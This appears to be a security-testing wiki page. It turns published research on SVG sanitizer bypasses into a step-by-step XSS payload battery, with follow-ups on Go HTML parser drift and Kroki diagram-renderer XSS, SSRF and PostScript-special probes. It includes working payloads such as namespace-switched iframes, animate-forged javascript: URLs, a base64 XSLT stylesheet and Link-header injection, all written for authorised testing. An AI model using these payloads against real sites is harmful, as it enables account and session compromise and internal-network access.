# SVG Sanitizer Bypass Testing

Source: PortSwigger Research, ["Scalable Vector Grief"](https://portswigger.net/research/scalable-vector-grief) (Gareth Heyes, October 27, 2026). Eight popular SVG sanitizers tested; six bypassed. DOMPurify and darylldoyle/svg-sanitizer held. This page turns the post into a replayable hunt battery for any product that accepts SVG uploads or renders user SVG (avatars, logos, diagram embeds, CMS media libraries, MCP/agent asset pipelines).

## Why this is durable

SVG is a document format whose sanitization must reason about *three* parse contexts at once, SVG, inlined XHTML (namespace switches, `foreignObject`), and XSLT, plus browser behaviors that never appear in the sanitizer's grammar model (URL scheme whitespace stripping, `<use>` cross-file import, `Link` header stylesheet loading). Every bypass below is a mismatch between "what the sanitizer's element/attribute list covers" and "what the browser will still execute." Same thesis as this wiki's DOMPurify/ammonia/SVGO mXSS lineage, generalized into a battery.

## The targets that fell

- mattkrick/sanitize-svg, multiple independent bypasses (namespace confusion, casing, nested SVG onload)
- Borewit/svg-sanitizer, `<animate>`/`<animateTransform>` pass-through
- bgalek/safe-svg, XSLT data-URL + Safari `<use>` image import
- cloudflare/svg-hush, jams2/py-svg-hush, alnorris/SVG-Sanitizer, Safari `<use>` GIF import (svg-hush pair), XSLT (SVG-Sanitizer)

Fingerprint the sanitizer in use first: each library leaves characteristic output (attribute reordering, comment stripping, allowlist residue). If the response HTML embeds sanitized SVG, diff a benign input against your raw input to identify the library and version before choosing a leg.

## Leg 1: per-element namespace switch → HTML island without foreignObject

Switch the XML namespace on a single child element to XHTML and the browser renders it as HTML *inside* the SVG. A `<frame>` with a JavaScript URL executes; an XHTML `<iframe>` grants `srcdoc`:

```html
<svg xmlns="http://www.w3.org/2000/svg"><frame xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(document.domain)"/></svg>
```

```html
<svg xmlns="http://www.w3.org/2000/svg"><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"/></svg>
```

**Operator rule:** every SVG sanitizer battery must include XHTML-namespaced elements *outside* `foreignObject`. Denylists written against the SVG element set never see the HTML element set that the namespace switch admits. This is the subtree analogue of the May 7 page's "sanitization context ≠ final parse context" thesis.

## Leg 2: casing and query-API mismatches

Sanitizers that parse via DOM (which camel-cases `foreignobject` → `foreignObject`) then hunt with `querySelectorAll('foreignobject')` match nothing and pass the payload through:

```html
<svg xmlns="http://www.w3.org/2000/svg"><foreignobject><img src=x onerror=alert(1)></foreignobject></svg>
```

Nested `<svg onload=...>` also passed. **Rule:** for any sanitizer that round-trips through a DOM implementation, submit every denylisted element name in each parser-normalized spelling (lowercase, camelCase, prefixed per Leg 1's namespace mechanics); the mismatch between DOM canonicalization and string selector matching is itself a bug class.

## Leg 3: animation attributes forge JavaScript URLs

`<animate>`/`<animateTransform>` settable attributes include `href`. Animate an `<a>` element's `href` into a `javascript:` URL after the sanitizer has already approved the document:

```html
<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" values="JavaScript:alert(1)"/><text x="20" y="20">XSS</text></a></svg>
```

Safari variant (Kevin Mizu's trick) uses `animateTransform` with an invalid transform type and `fill="freeze"` to land the scheme on a pre-approved safe `href`. **Rule:** when auditing an SVG allowlist, enumerate the *settable target attributes* of every surviving animation element (`animate`, `animateTransform`, `animateMotion`, `set`) against the URL-bearing attribute set (`href`, `xlink:href`, `src`, `action`, `formaction`). "Element allowed" ≠ "attributes it can mutate are allowed."

## Leg 4: self-contained XSLT stylesheet via data-URL processing instruction

The flagship technique: an `<?xml-stylesheet?>` PI pointing at a base64 (or URL-encoded) `data:` XSLT document transforms the *harmless-looking* SVG into an executed HTML page. The stylesheet's element name is itself constructed (`concat('scr','ipt')`) to dodge string denylists, and the result runs in the document's origin:

```
<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet type="text/xsl" href="data:text/xsl;base64,PHg6c3R5bGVzaGVldCB4bWxuczp4PSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHZlcnNpb249IjEuMCI+PHg6b3V0cHV0IG1ldGhvZD0iaHRtbCIvPjx4OnRlbXBsYXRlIG1hdGNoPSIvIj48aHRtbD48Ym9keT48eDplbGVtZW50IG5hbWU9Intjb25jYXQoJ3NjcicsJ2lwdCcpfSI+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwveDplbGVtZW50PjwvYm9keT48L2h0bWw+PC94OnRlbXBsYXRlPjwveDpzdHlsZXNoZWV0Pg=="?><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="30">XSS</text></svg>
```

The affected sanitizers never model processing instructions or external-resource PIs. **Timing note:** the feature is deprecated and scheduled for browser removal November 2026, treat as a closing window on targets still running older engines/WEBVIEWS; fingerprint engine version before reporting.

## Leg 5: XSS from a response header, body stays harmless XML

Firefox honors `Link: <...>; rel="stylesheet"` for XSLT, and **data URLs work inside the Link header**. A two-layer payload, outer URL-encoded stylesheet whose `document()` call loads an inner URL-encoded XHTML `<img onerror>` copied into a `foreignObject`, executes against a response body that is a completely benign XML fragment. Test shape (Paulos Yibelo's original trick was external CSS via Link; XSLT works the same):

```
Link: <data:application/xml,%3Cxsl%3Astylesheet%20...%3E>; rel="stylesheet"; type="text/xsl"
```

**Operator rules:**
- If you can influence *response headers* on an SVG/XML-serving path (header injection, misconfigured proxy/CDN rules, `Access-Control`-style header passthrough), document-level XSS is available with a clean body, content-only WAF/sanitizer review never sees the payload.
- Fuzz battery: `Link:` with `rel=stylesheet` in `text/css` and `text/xsl` types, both URL and `data:` schemes.
- The full layered payload is editable in Hackvertor from the post, reconstruct it as a Burp match-and-replace rule for header-injection replay.

## Leg 6: Safari imports image files as SVG via `<use>`

Safari's `<use href="same-origin-file#frag">` will fetch a `.png`/`.gif` and parse it **as SVG**. An uploaded GIF containing SVG markup won't render standalone but is still importable:

```html
<svg xmlns="http://www.w3.org/2000/svg"><use href="/uploads/test.gif#x" /></svg>
```

with the GIF carrying `<g id="x"><image href="1" onerror="alert(1)"/></g>`. This defeated svg-hush, py-svg-hush, and safe-svg because each only sanitizes the *referencing* document. **Operator rules:**
- On any same-origin file-store + SVG-render combination, the question is not "is the SVG clean" but "what else can `<use>` import." Enumerate upload extensions accepted by the same origin and test `<use href>` against each with an SVG-payload body.
- Content-type/MIME sniffing differences are the enabler: the file is stored/served as an image, parsed as XML.
- Firefox and Safari both allow `<use>` cross-file same-origin references, check `<use>` against same-origin non-image paths too (traversal, redirect targets).

## Consolidated battery (run in order on any SVG-accepting endpoint)

1. Fingerprint sanitizer + rendering pipeline from a benign SVG round-trip.
2. Namespace-switch battery: XHTML-namespaced `frame`, `iframe` (srcdoc), `img`, both inside and outside `foreignObject`.
3. Casing/selector battery: denylisted names in lowercase, camelCase, and xmlns-prefixed forms.
4. Animation-attribute battery: `animate`/`set` targeting `href`/`xlink:href`/`src` with `javascript:`, `data:text/html`, and Safari `animateTransform`+`freeze` spellings.
5. PI battery: `<?xml-stylesheet href=data:...?>` with base64 and URL-encoded transforms (mind the November 2026 deprecation window).
6. Header leg: any header-injection primitive on the serving path → `Link: data:…; rel=stylesheet; type=text/xsl`.
7. `<use>` import battery: same-origin `.gif`/`.png`/`.txt`/upload paths carrying SVG fragments, `#fragment` targeted.
8. Proof boundary: harmless DOM markers (`document.title` writes, owned-callback beacons) in your own upload/reply path; never stored payloads against other users' sessions.

## Cross-references

- [DOMPurify mXSS and ammonia/SVGO legs](../alerts/2026-05-07-dompurify-mxss-and-ivanti-epmm-kev-boundary-guidance.md), same parse-context thesis, per-library legs
- [SiYuan SVG namespace-prefix XSS](../alerts/2026-03-31-siyuan-reflected-xss-svg-namespace-prefix-bypass-ghsa-73g7-86qr-jrg3.md), prefixed-element bypass family
- [XSS payload hiding in tag names](xss-tag-name-payload-hiding-waf-bypass.md), parser/normalizer mismatch family

## October 28 follow-up: Go `html` parser legs, the sanitizer's own tree walk can end in the wrong foreign namespace (CVE-2026-97045 / [GHSA-vwcj-r8v9-p53f](https://github.com/advisories/GHSA-vwcj-r8v9-p53f); re-parse DoS CVE-2026-78661 / [GHSA-75pg-wvh3-34jr](https://github.com/advisories/GHSA-75pg-wvh3-34jr))

Two Go-side advisories (28 Oct 00:30Z wave, GO-2026-6866 / GO-2026-6860) extend the "sanitizer-vs-reparser drift" theme of this page from SVG libraries to the **parser most Go sanitizer/upload pipelines are built on** (`golang.org/x/net/html` / Go-side HTML round-tripping):

- **`childTextNodesAreLiteral` stopped its ancestor walk at the nearest foreign ancestor once an HTML integration point was found.** That integration point can itself be a descendant of a **foster-parented** element (`<mglyph>`/`<malignmark>` fostered under `<mtext>`), so the literal-text decision is made against a partial ancestor chain, the rendered output **reparses into a different foreign namespace** than the sanitizer's parse. Text the sanitizer believed inert re-enters markup context on the consumer's parse. This is the browser-side foreign-content mXSS family (SmarterMail iCal leg, Oct 9; DOMPurify, May 7) reproduced *inside* a server parser: the foster-parenting machinery is shared grammar, not browser-exclusive.
- **Coalescing adjacent text nodes via `n.Data += text` was O(n²)**, inputs of many short text runs separated by ignored end tags (`a</x>` repeated) turn a sanitizer round-trip into quadratic byte copies. Upload-pipeline DoS shape: the payload is *harmless markup*, so byte-budget WAF rules never see an attack; size it so the parse-out costs seconds on a shared worker.

Operator additions to this page's battery: (1) when the target's sanitizer is Go-based (fingerprint: Go-shaped error text, `net/http` headers, `server: …` absent), include **foster-parented MathML fragments** (`<math><mtext><mglyph>` + ignored end tags) in the namespace-drift battery, re-parse the *sanitized output* server-side or in a local Go harness and diff the tree, not just the bytes; (2) run the ignored-end-tag text-coalescing shape as the cheap parser-cost probe alongside the existing whitespace/prefix batteries. Fix CLs [go.dev/cl/855121](https://go.dev/cl/855121) / [go.dev/cl/849365](https://go.dev/cl/849365) are readable differential material for building the re-parse harness.

## November 14 follow-up: Kroki diagram endpoints, DSL settings that become output attributes (CVE-2026-129447 / [GHSA-r7q7-fpwp-8f26](https://github.com/advisories/GHSA-r7q7-fpwp-8f26), fixed 0.36.0)

Kroki (Java frontend + per-language Node converters) patched three render legs in one release, all instances of this page's core thesis applied one layer earlier than usual: the vulnerability is not in an SVG sanitizer, it is in the **diagram DSL settings copying verbatim into output document attributes** before any sanitizer exists.

- **`/dbml/svg` reflected XSS.** `@softwaretechnik/dbml-renderer` copies the table `url` setting as-is into a Graphviz `HREF` attribute, so a `javascript:` URL survives into the served SVG and executes in the Kroki origin when the table header is clicked, all from a GET URL (phishable link against a trusted render origin). The subtler second leg: the `headercolor` setting is copied as-is into the Graphviz *HTML-like label*, which lets you append your own `HREF` attribute there even if the obvious URL field were validated. **A color field is a URL-injection vector.** Fix [b57e1bdc](https://github.com/yuzutech/kroki/commit/b57e1bdc39df9521b249db0dbd56c5e0a8b7e33d) is post-render string surgery: strip `href`/`xlink:href` whose scheme is not `http`, `https`, `mailto` (relative refs allowed only if the pre-first-`/?#` segment contains no `:` and no `&`, because an XML entity can hide a scheme).
- **`/goat/svg` reflected XSS via "color" options.** `svg-color-dark-scheme`/`svg-color-light-scheme` values are inserted verbatim into a `<style>` element of the SVG, so `</style><script>...` breaks out into executable script. Same field-name-vs-output-context mismatch: an option that *sounds* like a scalar is rendered into markup.
- **`/tikz/svg` unauth RCE via `\special{ps:...}` was an incomplete fix.** The pipeline passed `--no-specials=ps` to `dvisvgm` 3.6, but that release **silently ignored the option** ([mgieseki/dvisvgm#306](https://github.com/mgieseki/dvisvgm/pull/306)), so PostScript specials still handed off to Ghostscript. The 0.36.0 mitigation strips `ps:`/`ps::`/`pst:`/`header=`/`psfile=`/`pdffile=` specials from the DVI *before* dvisvgm. **A hardening flag your pipeline passes is not a hardening flag that fires.**

Operator rules:

1. **Attribute-provenance sweep on diagram renderers.** For any endpoint that turns user diagram source (DBML, PlantUML, Mermaid, GoAT, TikZ, Graphviz DOT) into SVG/HTML, enumerate every DSL setting/option that maps to a URL-bearing or markup-bearing output attribute (`HREF`, `href`, `xlink:href`, `src`, `style`, label markup), regardless of what the input field is *named*. Color, label, and theme fields count.
2. **Battery per endpoint:** `javascript:`/`data:`/`view-source:` in every URL-ish setting; `</style><script>` and `</svg><img onerror>` in every scalar option interpolated into `<style>` or HTML-like labels; Graphviz HTML-label shapes (`label=<<a href="javascript:...">x</a>>`) on any field reaching a label.
3. **Fuzz the fix's post-processing regex, not just the input.** For the Kroki `SAFE_URL` shape, the differential surface is scheme spelling case, leading whitespace/newline inside the attribute value, entity-encoded colons, protocol-relative `//host` refs, and any parser that resolves the attribute differently than the strip regex matched it. Grab the fix commit and write the mismatch table before probing.
4. **Prove every upstream hardening flag with a canary.** On TikZ/PS/DVI-adjacent pipelines, submit a marker `\special{ps:...}` (or pipeline equivalent) even when the tool claims specials are disabled; silently-ignored options are a fail-open class of their own. Ghostscript handoff on any version predating current `-dSAFER` posture is the escalation leg.
5. **Deployment note:** Kroki is commonly embedded in docs, wikis, and chat pipelines (public `kroki.io` included), and reflected XSS via a crafted diagram GET link is a phishing surface on a rendering origin that victim apps trust. Fingerprint via `/health` or a benign round-trip per language endpoint; test each converter family separately, they are independent code paths with independent bug classes.

### November 15 follow-up: the same family's SSRF leg, `icon`/`background` fetched regardless of safe mode (CVE-2026-129485 / [GHSA-976x-w3hh-23xw](https://github.com/advisories/GHSA-976x-w3hh-23xw), fixed 0.36.0)

The second Kroki wave (15 Nov 18:30Z, published as per-leg GHSAs: [GHSA-3596-jrj6-mf2p](https://github.com/advisories/GHSA-3596-jrj6-mf2p) is the `/goat/svg` color-option XSS already documented above) added the outbound-fetch leg: a node's `icon` or `background` naming a URL or a local file was **fetched or read by blockdiag and embedded into the returned SVG**, "whatever the safe mode" ([Blockdiag.java v0.35.0 L64-85](https://github.com/yuzutech/kroki/blob/v0.35.0/server/src/main/java/io/kroki/server/service/Blockdiag.java)). Unauthenticated SSRF against internal services/cloud metadata plus local image-file read on every server not already running `UNSAFE`. Fix [becd3b4a](https://github.com/yuzutech/kroki/commit/becd3b4a86754cb08d0fe54f65e92a6cab542409) bumps the builder image to blockdiag 3.4.3 and passes its **new** `--no-external-images` flag unless Kroki runs in `UNSAFE` mode.

Operator rules this leg adds:

1. **A wrapper's safe-mode switch is a per-converter coverage claim, not a global policy.** Kroki's `KROKI_SAFE_MODE` gated Structurizr restricted mode, Lini `--no-fs`, and friends, but `Blockdiag.java` never consulted `SafeMode` before the fix, so SAFE deployments still fetched. For any multi-engine renderer, build a decision table: per endpoint, what does the wrapper pass to the backend when safe mode is on, and what does the backend do anyway. Grep the wrapper's service classes for the safe-mode symbol; classes that never import it are the first test targets.
2. **DSL attributes that name a URL or file are server-side fetchers.** Sweep `icon=`, `background=`, and each family's equivalents (`packetdiag`/`nwdiag` image fields, PlantUML `!include`/`!url`, Mermaid image nodes) against an owned callback and a known local path (`/proc/self/environ`-adjacent marker images aside, prove with an owned file you placed in the converter's container). **The embedding is the read-back channel**: fetched bytes come back base64'd inside the returned SVG, so local-file reads need no oracle and no timing.
3. **Six endpoints, one flag.** BlockDiag, SeqDiag, ActDiag, NwDiag, PacketDiag and RackDiag all run on the shared `kroki-builder-blockdiag` image, so proof on one endpoint plus version evidence generalizes, but still round-trip each `/xxx/svg` route: the Kroki changelog itself shows per-endpoint bug classes (DBML HREF, GoAT style breakout, TikZ specials) with independent fixes.
4. **Version fingerprint that needs no banner:** submit `blockdiag { a [icon="http://your-callback/x.png"] }` and POST it to `/blockdiag/svg`. A callback hit means `--no-external-images` is absent (pre-3.4.3 builder / pre-0.36.0 server); the flag's absence is the finding. This is the same "canary-prove every upstream hardening flag" rule from the TikZ `--no-specials=ps` leg above, now applied to the SSRF posture instead of the sandbox posture. Keep proofs to owned callbacks and lab-placed marker files; never read real deployment files or probe customer internal ranges beyond authorized scope.
